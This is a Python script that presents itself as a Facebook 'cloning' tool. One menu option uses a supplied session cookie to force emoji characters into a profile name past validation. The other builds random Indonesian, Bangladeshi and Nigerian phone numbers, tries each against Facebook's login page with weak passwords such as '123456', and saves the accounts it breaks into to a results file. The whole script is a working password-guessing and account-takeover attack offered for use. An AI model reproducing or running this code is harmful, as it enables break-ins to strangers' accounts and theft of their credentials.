#--> Script Owner: Charsi Coder (Elite)
#--> Update: Fixed Escape Sequence Error
#--> Purpose: Invalid Emoji Names + Random Cloning

import os, sys, time, re, random, requests
from bs4 import BeautifulSoup as bs

#--> Charsi Colors
G = "\x1b[38;5;46m"  # Green
D = "\x1b[38;5;28m"  # Dark Green
W = "\x1b[38;5;231m" # White
R = "\x1b[38;5;196m" # Red
Y = "\x1b[38;5;226m" # Yellow

def clear():
    os.system('clear' if 'linux' in sys.platform.lower() else 'cls')

def charsi_logo():
    # 'r' prefix added to fix SyntaxWarning
    print(r"""{D}
      _______  _    _  _______  ______   _______  _________
     (_______)(_)  (_)(_______)(_____ \ (_______)(_________)
      _        _    _  _______  _____) ) _           _    
     | |      | |__| ||  ___  ||  __  / | |         | |   
     | |_____ |  __  || |   | || |  \ \ | |_____   _| |_  
      \______)(_)  (_)(_)   (_)(_)   (_)(_______) (_____)
    {G}   [#] STAY HIGH • CLONE FAST • EMOJI BYPASS [#]
    {W}   -------------------------------------------""".format(D=D, G=G, W=W))

class CharsiMaster:
    def __init__(self):
        self.ses = requests.Session()
        if not os.path.exists('Results'): os.mkdir('Results')
        self.main_menu()

    def main_menu(self):
        clear(); charsi_logo()
        print(f"{G}[1] {W}Invalid Emoji Name Changer {D}(Japan Proxy)")
        print(f"{G}[2] {W}Random Number Cloning     {D}(ID, BD, NG)")
        print(f"{G}[0] {R}Exit")
        
        opt = input(f"\n{D}┌─[{G}Select{D}]\n{D}└─{G}> {W}")
        
        if opt == '1': self.emoji_changer()
        elif opt == '2': self.cloning_menu()
        else: sys.exit()

    def emoji_changer(self):
        clear(); charsi_logo()
        print(f"{Y}[!] Connect Japan VPN First!{W}\n")
        cookie = input(f"{G}[?] Enter FB Cookie: {W}")
        first = input(f"{G}[?] First Name: {W}")
        emoji = input(f"{G}[?] Paste Emojis (👿🩶💔々): {W}")
        last = input(f"{G}[?] Last Name: {W}")
        
        headers = {
            'cookie': cookie,
            'user-agent': 'Mozilla/5.0 (Linux; Android 13; Japan) AppleWebKit/537.36',
            'referer': 'https://m.facebook.com/settings/edit_name/'
        }
        
        try:
            res = self.ses.get('https://m.facebook.com/settings/edit_name/', headers=headers).text
            fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"', res).group(1)
            jazoest = re.search('name="jazoest" value="(.*?)"', res).group(1)
            
            data = {'fb_dtsg': fb_dtsg, 'jazoest': jazoest, 'firstname': first, 'middlename': emoji, 'lastname': last, 'save': 'Review Change'}
            post = self.ses.post('https://m.facebook.com/settings/edit_name/', data=data, headers=headers).text
            
            if "password" in post.lower() or "review" in post.lower():
                print(f"\n{G}[SUCCESS] Name Accepted! Confirm in Browser.{W}")
            else:
                print(f"\n{R}[FAILED] Emojis Rejected!{W}")
        except: print(f"{R}Cookie Error!{W}")
        input(f"\n{G}Press Enter..."); self.main_menu()

    def cloning_menu(self):
        clear(); charsi_logo()
        print(f"{G}[1] Indonesia (+62)\n[2] Bangladesh (+880)\n[3] Nigeria (+234)")
        c_opt = input(f"\n{D}┌─[{G}Country{D}]\n{D}└─{G}> {W}")
        if c_opt == '1': self.start_clone('+62', ['812','813'])
        elif c_opt == '2': self.start_clone('+880', ['17','19'])
        elif c_opt == '3': self.start_clone('+234', ['703','803'])
        else: self.main_menu()

    def start_clone(self, code, sims):
        sim = input(f"{G}[?] Select Code {sims}: {W}")
        limit = int(input(f"{G}[?] Limit: {W}"))
        print(f"\n{G}[!] Started... Use Airplane Mode!{W}\n")
        for _ in range(limit):
            num = sim + str(random.randint(1111111, 9999999))
            pws = [num, num[:6], '786786', '123456']
            self.crack(num, pws, code)

    def crack(self, user, pws, code):
        ua = "Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36"
        for pw in pws:
            try:
                data = {'email': code+user, 'pass': pw, 'login': 'Log In'}
                res = self.ses.post('https://m.facebook.com/login/device-based/regular/login/', data=data, headers={'User-Agent': ua})
                if "c_user" in self.ses.cookies.get_dict():
                    print(f"\r{G}[OK] {code}{user} | {pw}{W}           ")
                    open("Results/OK.txt", "a").write(f"{code}{user}|{pw}\n")
                    break
                elif "checkpoint" in self.ses.cookies.get_dict():
                    print(f"\r{Y}[CP] {code}{user} | {pw}{W}           ")
                    break
                else: print(f"\r{D}[RUNNING] {user}..{W}", end="")
            except: pass

if __name__ == "__main__":
    CharsiMaster()
